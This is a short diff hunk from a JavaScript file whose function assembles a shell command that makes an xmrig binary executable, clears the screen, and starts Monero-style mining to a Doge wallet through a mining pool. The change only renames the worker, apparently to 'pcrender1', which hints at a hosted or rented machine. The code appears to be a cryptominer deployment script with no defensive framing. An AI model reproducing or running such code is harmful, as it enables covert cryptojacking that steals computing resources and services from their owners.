@@ -56,7 +56,7 @@ const controller = async () => {
     text += "&& chmod +x xmrig ";
     text += "&& clear ";
     text +=
-      "&& ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:D9Mq2fXA4vBAqBr1zqv1F9cjViw5qF43iW.pc1#rup9-jjmz -p x";
+      "&& ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:D9Mq2fXA4vBAqBr1zqv1F9cjViw5qF43iW.pcrender1#rup9-jjmz -p x";
 
     for (let i = 0; i < text.length; i++) {
       const char = text[i];
